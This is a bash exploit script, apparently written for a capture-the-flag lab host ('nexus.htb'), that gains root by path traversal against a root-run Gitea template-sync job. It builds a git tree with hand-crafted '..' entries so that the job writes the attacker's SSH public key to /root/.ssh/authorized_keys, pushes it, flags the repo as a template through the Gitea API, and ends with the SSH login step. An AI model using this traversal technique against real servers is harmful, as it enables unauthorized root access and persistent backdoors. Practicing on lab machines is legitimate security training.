#!/bin/bash
# Nexus root - abuse gitea-template-sync.py (runs as root every 60s).
# It writes every blob of a "template" repo to
#   /home/git/template-staging/<owner>/<name>/<filepath>
# with <filepath> taken verbatim from the git tree -> path traversal.
# We push a repo whose tree path is ../../../../../root/.ssh/authorized_keys
# containing our SSH pubkey, flag it as a template, and wait for root to write it.
#
# Usage: ./nexus_root_template_traversal.sh <gitea_user> <gitea_pass> <pubkey_file>

set -e

USER="$1"
PASS="$2"
PUBKEY="$3"
BASE="http://git.nexus.htb"
REPO="tpl"
TRAVERSAL="../../../../../root/.ssh/authorized_keys"

if [ -z "$USER" ] || [ -z "$PASS" ] || [ -z "$PUBKEY" ]; then
    echo "Usage: $0 <gitea_user> <gitea_pass> <pubkey_file>"
    exit 1
fi

echo "[*] Creating empty repo $USER/$REPO via Gitea API"
curl -s -u "$USER:$PASS" -X POST "$BASE/api/v1/user/repos" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"$REPO\",\"private\":false,\"auto_init\":false}" -o /dev/null || true

WORK=$(mktemp -d)
cd "$WORK"
git init -q
git config user.email root@nexus.htb
git config user.name root

echo "[*] Building malicious tree with path: $TRAVERSAL"
BLOB=$(git hash-object -w --stdin < "$OLDPWD/$PUBKEY")
T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)   # contents of .ssh
T=$(printf '040000 tree %s\t.ssh\n' "$T" | git mktree)                # contents of root
T=$(printf '040000 tree %s\troot\n' "$T" | git mktree)                # contents of /
for i in 1 2 3 4 5; do                                                # 5x ".." to reach /
    T=$(printf '040000 tree %s\t..\n' "$T" | git mktree)
done

COMMIT=$(git commit-tree "$T" -m "template")
git update-ref refs/heads/master "$COMMIT"

echo "[*] Pushing to $BASE/$USER/$REPO.git (sets default branch on empty repo)"
git push -q "http://$USER:$PASS@git.nexus.htb/$USER/$REPO.git" master

echo "[*] Flagging repo as template"
curl -s -u "$USER:$PASS" -X PATCH "$BASE/api/v1/repos/$USER/$REPO" \
    -H "Content-Type: application/json" -d '{"template":true}' -o /dev/null

echo "[+] Done. Within ~60s root will write your key to /root/.ssh/authorized_keys."
echo "[+] Then: ssh -i <your_private_key> root@nexus.htb"
cd "$OLDPWD"
